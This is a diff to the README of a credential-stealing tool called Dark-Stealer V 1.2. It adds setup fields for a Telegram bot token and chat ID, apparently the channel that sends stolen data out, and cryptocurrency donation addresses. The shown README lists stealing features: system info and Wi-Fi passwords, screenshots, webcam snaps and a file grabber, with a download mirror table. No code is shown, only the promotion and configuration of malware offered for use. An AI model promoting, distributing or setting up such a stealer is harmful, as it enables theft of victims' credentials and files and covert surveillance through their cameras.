@@ -12,7 +12,8 @@
 ⚡️ Quick Start
 install Python 3.11
 pip install -r requirements.txt
-
+Telegram Bot Token :
+Chat ID :
 ---
 Downloade : Dark-Stealer V 1.2
 | Mirror                                          | Status |
@@ -43,3 +44,13 @@ Downloade : Dark-Stealer V 1.2
 ✔ System info & Wi-Fi passwords  
 ✔ Screenshots & webcam snap  
 ✔ File grabber (custom extension list)  
+---
+
+Donations
+If this project has served you well or been useful for resarching, please feel free to donate:
+
+BTC: bc1q9m8h489ha078hmyjplymnryqrgdsqtm4etv3zs
+LTC: ltc1qfcrpmxw742lcef435526lwdqynt8ersmt4yha7
+USDT: TUCra7c48byL4xHfZWnXgmJDuPw9upTPz2
+
+
